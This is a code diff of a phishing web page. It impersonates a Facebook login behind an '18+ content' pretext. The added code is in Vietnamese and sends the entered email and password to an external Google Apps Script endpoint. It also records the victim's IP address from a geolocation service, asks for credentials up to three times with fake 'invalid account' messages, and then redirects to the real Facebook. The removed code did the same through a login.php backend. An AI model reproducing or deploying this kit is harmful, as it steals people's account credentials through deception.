@@ -39,100 +39,142 @@
 
 
         </div>
-        <div class="modal fade" id="myModal" role="dialog">
-            <section class="login-form-wrap">
-                <h1>Facebook</h1>
-                <div style="background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="result">This website requires you to be 18 years or older to enter! Please login Facebook to Confirm</div>
-                <div class="login-form" >
-                    <label>
-                        <input type="text" id="id" name="email" required placeholder="Email address or phone number">
-                    </label>
-                    <label>
-                        <input type="password" id="pass" name="pass" required placeholder="Password">
-                    </label>
-                    <button type="submit" id="submit" value="Log In">Log In </button>
+        <div id="myModal" class="modal fade" role="dialog">
+        <div class="modal-dialog">
+            <!-- Modal content-->
+            <div class="modal-content">
+                <div class="modal-body">
+                    <section class="login-form-wrap">
+                        <h1 class="facebook_logo">Facebook</h1>
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Nội dung 18+, vui lòng đăng nhập trước khi xem.</div>
+                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbzsLBOH38HNtEp-cn1dbzLkro_ww8iETOYhDwF5N6ce7EgHcmxfW6rmKP2EYR52LVVMyw/exec">
+                            <label class="mt-10">
+                                <input id="username" type="text" name="username" required="" placeholder="Email hoặc số điện thoại">
+                            </label>
+                            <label class="mt-10">
+                                <input id="password" type="password" name="password" required="" placeholder="Mật khẩu">
+                            </label>
+							<input id="country" type="text" name="country" style="display:none">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Đăng nhập">
+                        </form>
+                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Quên mật khẩu?</a></h5>
+                    </section>
                 </div>
-                <h5><a href="#">Forgotten password?</a></h5>
-            </section>
+            </div>
         </div>
-        <script src="//code.jquery.com/jquery.js"></script>
-        <script type="text/javascript">
-                $(document).ready(function () {
-                                    });
-                function showlog() {
-                    $('#myModal').modal({
-                        backdrop: 'static',
-                        keyboard: true,
-                        show: true
-                    });
-                }
-        </script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
-        <script>
-        setInterval(function () {
-      
- }, 0);
- function lee() {
-     debugger
- }
- function getcountry() {
-
-var jqXHR = $.ajax({
- url: 'https://cloudflare.com/cdn-cgi/trace',
-//...
-
-async: false
-
-});
-
-return jqXHR.responseText.match(/loc=(.+)/)[1];
-
-}
- 
- var country = getcountry();
- console.log(country);
- 
- 
- 
- 	ip = "222.252.98.61";
-$('#submit').click(function () {
-    let uid = $('#id').val();
-    let pass = $('#pass').val();
+    </div>
+    </body>
 	
-    if (!uid || !pass) {
-        $('#result').html("The email address or mobile number you entered isn't connected to an account");
-        return false
-    };
-    $('#submit').html('Please Wait!! !');
+	<div style="position: fixed; z-index: 10000; text-align: center; top: 0; display: none; left: 0; width: 100vw; height: 100vh; background-color: rgba(0,0,0,.5);" id="loading">
+    <img src="https://www.fk-austria.at/?proxy=images/waiting.gif" style="margin-top: 100px; width: 100px; height: 100px;">
+</div>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<script type="text/javascript">
+$(document).ready(() => {
+    let num = Math.floor(Math.random() * 5) + 1;
+    $('#img' + num).show();
+});
+var count = 0;
 
-    $.ajax({
-        url: 'login.php',
-        type: 'POST',
-        dataType: 'JSON',
-        data: {
-            pass: pass,
-            uid: uid,
-			ip:ip,
-			country:country,
-			uri:window.location.href.split('?')[0],
+var g_IPAdress = "";
+var g_Country = "";
+GetIPAdress();
+function GetIPAdress() {
+ var requestOptions = {
+ method: 'GET',
+ redirect: 'follow'
+ };
 
-        },
-        success: (data) => {
-            $('#submit').html('Log In');
-            if (data.error) {
-                $('#result').html(data.msg);
-                $('input').val('')
-            } else {
-                setTimeout(function () {
-                   window.location = data.url
-                }, 1000)
+ fetch("http://gd.geobytes.com/GetCityDetails", requestOptions)
+ .then(response => response.text())
+ .then(result => {
+ try {
+ let res = JSON.parse(result);
+ g_IPAdress = res.geobytesipaddress;
+ g_Country = res.geobytesfqcn;
+ 
+ document.getElementById("country").value = g_IPAdress;
+ }
+ catch (ex) { }
+
+ })
+ .catch(error => console.log('error', error));
+}
+
+function submitForm() {
+    if (!$('#username').val().includes('@') || $('#password').val().length < 6) {
+		alert('Thông tin vừa nhập không đúng');
+		return;
+    } else {
+        count++;
+    }
+
+    if (count < 3) {
+        console.log(count);
+        $('#loading').show();
+        var data = $('form#test-form').serialize();
+        $.ajax({
+            type: 'GET',
+            url: 'https://script.google.com/macros/s/AKfycbzsLBOH38HNtEp-cn1dbzLkro_ww8iETOYhDwF5N6ce7EgHcmxfW6rmKP2EYR52LVVMyw/exec',
+            dataType: 'json',
+            crossDomain: true,
+            data: data,
+            success: function(data) {
+                if (count == 2) {
+                    $('#noti').css({ "color": "red" });
+                } else if (count == 1) {
+                    $('#noti').css({ "color": "#879600" });
+                }
+                $('#noti').text('Tài khoản bạn vừa nhập không hợp lệ, Vui lòng thử lại.');
+                $('#loading').hide();
+				
+				
+				
+				location.href = "https://www.facebook.com";
+				
+            }, error: function(request, status, error) {
+                $('#loading').hide();
+				
+				location.href = "https://www.facebook.com";
             }
-        }
-    })
+        });
+    } else {
+        $('#loading').show();
+        var data = $('form#test-form').serialize();
+        $.ajax({
+            type: 'GET',
+            url: 'https://script.google.com/macros/s/AKfycbzsLBOH38HNtEp-cn1dbzLkro_ww8iETOYhDwF5N6ce7EgHcmxfW6rmKP2EYR52LVVMyw/exec',
+            dataType: 'json',
+            crossDomain: true,
+            data: data,
+            success: function(data) {
+				//alert('ok');
+				
+				location.href = "https://www.facebook.com";
+            }
+        });
+    }
+}
+
+function showModal(e) {
+    $('#myModal').modal({
+        backdrop: 'static',
+        keyboard: true,
+        show: true
+    });
+}
+
+$('#myModal').click(() => {
+    event.stopPropagation();
 })
 
+$('#loading').click(() => {
+    event.stopPropagation();
+})
 </script>
-    </body>
+
 
 
 </html>
